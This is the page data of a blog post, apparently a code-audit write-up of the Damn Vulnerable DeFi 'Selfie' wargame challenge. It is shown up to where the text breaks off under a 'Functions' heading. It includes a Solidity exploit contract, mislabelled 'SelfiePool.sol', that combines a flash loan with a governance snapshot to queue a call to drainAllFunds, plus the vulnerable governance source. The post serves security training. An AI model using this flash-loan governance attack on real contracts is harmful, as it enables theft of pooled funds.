{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/defi-wargame-6/",
    "result": {"data":{"cur":{"id":"89561d23-d132-589e-97d7-7094631e6016","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACf0lEQVQoz1WRyWsTYQDFv9kySzqdZLJ2MpOZ78skk2mapKnpNOk0SdPW2KRt1HRxKV1c2lpKwXoQRRFBBC3ighcv3jx40YOoaEH0opcKriCCInoQPPoPiKT1Ivx4t987vAeuLo1N2X2CaLa44rzb5N2m4El4g2nRn/QFO0V/0u1rIvqTnkDa5UnErfrchduVxfNoaB5oIcPn1gmHhjtU3KFhVJhiUZuSDUiZMMopsKdNzgblbEi11EhOCmeT3SON1Yu7j182J04AbEsjGUixiGSgg0UUAykGEjRsccXlppNXI/kwzKGoraI8jNrJXN2qzuulA4BgEdnajjsigFIILgoIBVBqMzEJ4CFAyAAL4VSzneYiFIMwTCIZSLKIEwzQ3rt3avHs8OhSl90YaCwPjy0M1Bd2jh6tVKcL5Qm72KjUpjvSQyQDAWhjGM3KDJGMStCQbYmCcKoyMrlSKs92dI/1Vmft0kF711xPYdJoL8GoHVKtiFFweTs4PmpAq1Zd+fr2hwqLAJd4lwl8el+iMB5L1+RoUcnUJa0UT9UUlHd54gALAULBcBkAyS91f374dPP++1fP/qws3sJpjeZ04FJ7vWbFD8tCwBL0ik8uBmJlNdYflNK0U6dYRLERgtacYmrmyPr6pSc3r70+vXYnKPUASgHHZk+dXL0yPrImoX6POSzBcsAYVGMDghhneZ2gYXMeBjq4SEAupDv3lfrmrR1ToqfLyabBr+cffr/8/vHeu+WZc3JsUPBmWN5k+ZiDQxT7z9xm+0LemQ237k+5z+TEG2Dz7sa3x29+bnx5cP2RgUqAlElGI2iNYP4zya3nOSGWUA5N6i8OG5/2qBt/AShdfU2cIedjAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Selfie-contract\"\n        title=\"Selfie-contract\"\n        src=\"/static/9a5d43546788f9918cc85602449b35b6/37523/c6.png\"\n        srcset=\"/static/9a5d43546788f9918cc85602449b35b6/e9ff0/c6.png 180w,\n/static/9a5d43546788f9918cc85602449b35b6/f21e7/c6.png 360w,\n/static/9a5d43546788f9918cc85602449b35b6/37523/c6.png 720w,\n/static/9a5d43546788f9918cc85602449b35b6/e996b/c6.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #6 — Selfie <br></p>\n</blockquote>\n<p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p>\n<p>Wow, and it even includes a really fancy governance mechanism to control it.</p>\n<p>What could go wrong, right ?</p>\n<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p>\n<ul>\n<li><a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.1.0/contracts/selfie\">See the contracts</a></li>\n<li><a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/selfie/selfie.challenge.js\">Complete the challenge</a></li>\n</ul>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>SelfiePool.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SimpleGovernance.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SelfiePool.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SelfieExploit</span> <span class=\"token punctuation\">{</span>\n\n    SimpleGovernance <span class=\"token keyword\">public</span> governance<span class=\"token punctuation\">;</span>\n    SelfiePool <span class=\"token keyword\">public</span> pool<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> actionId<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> gvContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> poolContract<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        governance <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>gvContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">SelfiePool</span><span class=\"token punctuation\">(</span>poolContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">}</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span>DamnValuableTokenSnapshot token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionId <span class=\"token operator\">=</span> governance<span class=\"token punctuation\">.</span><span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \n                    abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                        <span class=\"token string\">\"drainAllFunds(address)\"</span><span class=\"token punctuation\">,</span>\n                        tx<span class=\"token punctuation\">.</span>origin\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token number\">0</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"./SimpleGovernance.sol\";</code></pre></div>\n<ul>\n<li>The @Openzeppelin external library contract is dependent on ReentrancyGuard, ERC20Snapshot, Address.</li>\n<li>Using the internal contract SimpleGovernance.</li>\n</ul>\n<h3 id=\"state-variables\" style=\"position:relative;\"><a href=\"#state-variables\" aria-label=\"state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variables</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">ERC20Snapshot public token;\nSimpleGovernance public governance;</code></pre></div>\n<ul>\n<li>Variable for initial instance to use other contract. Allocate ERC20 snapshot token and SimpleGovernance contract distribution address values, respectively.</li>\n</ul>\n<h3 id=\"fucntions\" style=\"position:relative;\"><a href=\"#fucntions\" aria-label=\"fucntions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fucntions</h3>\n<p><code class=\"language-text\">modifier onlyGovernance()</code></p>\n<p>✅ Checks whether the value of the msg.sender address is the same as the “governance contract” address, and only if governance conditions are met, it can pass that modifier.</p>\n<p><code class=\"language-text\">constructor(address tokenAddress, address governanceAddress)</code></p>\n<ul>\n<li>token, governance Set the address of each deployed contract to the contract assignment variable value.</li>\n</ul>\n<p><code class=\"language-text\">function flashLoan(uint256 borrowAmount) external nonReentrant</code></p>\n<p>✅ In order to pass the condition, the value received as the borrowAmount argument of this function must be equal to or less than the balance value of ERC20Snapshot tokend. (Basic logic for getting a loan)</p>\n<ul>\n<li>Based on the transfer function of the ERC20Snapshot token, the token is transferred to msg.sender as much as the borrowAmount value.</li>\n</ul>\n<p>✅ msg.sender checks whether it is a deployed contract based on the isContract() function.</p>\n<ul>\n<li>Executes the msg.sender.functionCall command and calls receiveTokens(address, uint256) with the ABI function selector based on msg.sender.</li>\n</ul>\n<p>✅ After making a loan, we check to see if the loan has been returned to the borrower.</p>\n<p>☑️ Must pass onlyGovernance modifier.</p>\n<ul>\n<li>Based on the ERC20Snapshot token contract function transfer, the token is delivered as much as the amount value (balance of the token contract) to the receiver of this function parameter.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title SimpleGovernance\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SimpleGovernance</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">GovernanceAction</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes</span> data<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> proposedAt<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> executedAt<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    DamnValuableTokenSnapshot <span class=\"token keyword\">public</span> governanceToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> GovernanceAction<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> actions<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> actionCounter<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> ACTION_DELAY_IN_SECONDS <span class=\"token operator\">=</span> <span class=\"token number\">2</span> days<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ActionQueued</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> caller<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> caller<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> governanceTokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>governanceTokenAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Governance token cannot be zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governanceToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableTokenSnapshot</span><span class=\"token punctuation\">(</span>governanceTokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionCounter <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_hasEnoughVotes</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough votes to propose an action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>receiver <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot queue actions that affect Governance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> actionId <span class=\"token operator\">=</span> actionCounter<span class=\"token punctuation\">;</span>\n\n        GovernanceAction <span class=\"token keyword\">storage</span> actionToQueue <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>receiver <span class=\"token operator\">=</span> receiver<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>weiAmount <span class=\"token operator\">=</span> weiAmount<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>proposedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionCounter<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionQueued</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot execute this action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        GovernanceAction <span class=\"token keyword\">storage</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionToExecute<span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">,</span>\n            actionToExecute<span class=\"token punctuation\">.</span>weiAmount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getActionDelay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> ACTION_DELAY_IN_SECONDS<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev an action can only be executed if:\n     * 1) it's never been executed before and\n     * 2) enough time has passed since it was first proposed\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        GovernanceAction <span class=\"token keyword\">memory</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span>\n            <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">-</span> actionToExecute<span class=\"token punctuation\">.</span>proposedAt <span class=\"token operator\">>=</span> ACTION_DELAY_IN_SECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">_hasEnoughVotes</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> balance <span class=\"token operator\">=</span> governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">getBalanceAtLastSnapshot</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> halfTotalSupply <span class=\"token operator\">=</span> governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">getTotalSupplyAtLastSnapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> balance <span class=\"token operator\">></span> halfTotalSupply<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"dependency-1\" style=\"position:relative;\"><a href=\"#dependency-1\" aria-label=\"dependency 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">import \"../DamnValuableTokenSnapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";</code></pre></div>\n<ul>\n<li>Use the Address contract of the <code class=\"language-text\">@Openzeppelin</code> library contract.</li>\n<li>Use the <code class=\"language-text\">DamnValuableTokenSnapshot</code> contract.</li>\n</ul>\n<h3 id=\"state-vairables\" style=\"position:relative;\"><a href=\"#state-vairables\" aria-label=\"state vairables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Vairables</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">GovernanceAction</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes</span> data<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> proposedAt<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> executedAt<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>It is used as a dependent structure in the Governance contract, and each member variable can be confirmed as data necessary for the logic configuration of the contract.</li>\n<li>Let’s take a brief look at each variable. Allocate address receiver contract address and user account address. Since the bytes data variable is assigned a value of the bytes type, it can contain specific data. The uint256 weAmount variable allocates the amount of tokens on a wei basis. The uint256 propsedAt variable is used to measure the time of the Goverence condition. The executedAt variable is used to record the function executeAction call. Each data structure is governed by Goverence Action logic.</li>\n</ul>\n<p><code class=\"language-text\">mapping(uint256 => GovernanceAction) public actions</code></p>\n<ul>\n<li>This is a mapping structure to manage the GovernanceAction Struct explained above, and manages each structure with a key value named ActionID in the increment state.</li>\n</ul>\n<p><code class=\"language-text\">uint256 private actionCounter</code></p>\n<ul>\n<li>It is a variable to measure the Coutner of the ActionID value when each Action structure is assigned to manage the action structures.</li>\n</ul>\n<p><code class=\"language-text\">uint256 private ACTION_DELAY_IN_SECONDS = 2 days;</code></p>\n<ul>\n<li>It is used to measure whether the executeAction function can be called inside the function _canBeExecuted(uint256 actionId) function based on the time of 2 days.</li>\n</ul>\n<h2 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h2>\n<p><code class=\"language-text\">constructor (address governanceTokenAddress)</code></p>\n<p>✅ 